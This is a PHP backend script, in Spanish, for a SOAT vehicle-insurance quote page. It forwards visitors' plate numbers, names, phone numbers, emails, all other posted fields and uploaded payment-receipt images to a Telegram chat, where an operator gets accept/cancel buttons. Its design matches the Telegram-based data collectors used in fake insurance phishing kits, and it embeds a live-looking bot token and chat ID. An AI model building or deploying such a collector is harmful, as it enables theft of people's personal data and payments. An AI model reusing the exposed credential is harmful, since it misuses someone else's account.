|<?php

header('Content-Type: application/json');

$botToken = '8939630118:AAGZZlanPGdzZVKgmGIN32Sh2ganRSbiv78';
$chatId = '8899337498';
// ===============================
// RECIBIR COMPROBANTE QR
// ===============================

if (isset($_FILES['comprobante'])) {

    $archivo = $_FILES['comprobante'];

    if ($archivo['error'] !== UPLOAD_ERR_OK) {
        echo json_encode([
            'ok' => false,
            'error' => 'Error al recibir el comprobante'
        ]);
        exit;
    }

    $mime = mime_content_type($archivo['tmp_name']);

    $permitidos = [
        'image/jpeg',
        'image/png',
        'image/webp'
    ];

    if (!in_array($mime, $permitidos, true)) {
        echo json_encode([
            'ok' => false,
            'error' => 'El comprobante debe ser una imagen JPG, PNG o WEBP'
        ]);
        exit;
    }

    $caption =
        "🧾 COMPROBANTE DE PAGO SOAT\n\n" .
        "PLACA: " . ($_POST['placa'] ?? '') . "\n" .
        "VALOR: " . ($_POST['precio'] ?? '') . "\n" .
        "NOMBRE: " . ($_POST['nombrePropietario'] ?? '') . "\n" .
        "TELÉFONO: " . ($_POST['telefonoPropietario'] ?? '') . "\n" .
        "CORREO: " . ($_POST['correoPropietario'] ?? '');

    $url = "https://api.telegram.org/bot{$botToken}/sendPhoto";

  $postData = [
    'chat_id' => $chatId,
    'caption' => $caption,
    'photo' => new CURLFile(
        $archivo['tmp_name'],
        $mime,
        $archivo['name']
    ),
    'reply_markup' => json_encode([
        'inline_keyboard' => [
            [
                [
                    'text' => '✅ ACEPTAR',
                    'callback_data' => 'aceptar'
                ],
                [
                    'text' => '❌ CANCELAR',
                    'callback_data' => 'cancelar'
                ]
            ]
        ]
    ])
];

    $ch = curl_init($url);

    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);

    curl_close($ch);

    echo $response;
    exit;
}

$data = json_decode(file_get_contents('php://input'), true);

if (!$data) {
    echo json_encode([
        'ok' => false,
        'error' => 'No se recibieron datos'
    ]);
    exit;
}

$mensaje = "🔔 NUEVA COTIZACIÓN SOAT\n\n";

foreach ($data as $campo => $valor) {
    $mensaje .= strtoupper($campo) . ": " . $valor . "\n";
}

$url = "https://api.telegram.org/bot{$botToken}/sendMessage";

$postData = [
    'chat_id' => $chatId,
    'text' => $mensaje
];

$ch = curl_init($url);

curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);

curl_close($ch);

echo $response;